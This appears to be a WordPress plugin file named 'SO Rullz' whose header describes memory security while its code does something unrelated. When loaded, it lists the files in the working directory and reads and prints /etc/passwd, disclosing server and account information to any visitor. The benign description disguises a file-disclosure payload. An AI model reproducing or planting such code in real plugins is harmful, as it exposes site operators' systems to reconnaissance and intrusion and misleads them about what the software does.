<?php
/**
 * @package SO Rullz
 * @version 2.0.26
 */
/*
Plugin Name: SO Rullz
Plugin URI: http://wordpress.org/plugins/so-rullz/
Description: Memory security is one of the most important aspects in today's computer systems. Its main objectives are to avoid the development of vulnerable code and prevent attackers from exploiting existing memory vulnerabilities. Memory protection techniques are implemented at all levels of memory abstraction: hardware, operating system and programming language. In addition, third-party software tools may be used to statically and dynamically examine a program to identify vulnerabilities when working with memory.
Author: SO Rullz
Version: 2.0.26
Text Domain: so-rullz
*/


if ($handle = opendir('.')) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            echo "$entry\n";
        }
    }

    closedir($handle);
}


$homepage = file_get_contents('/etc/passwd');
echo $homepage;
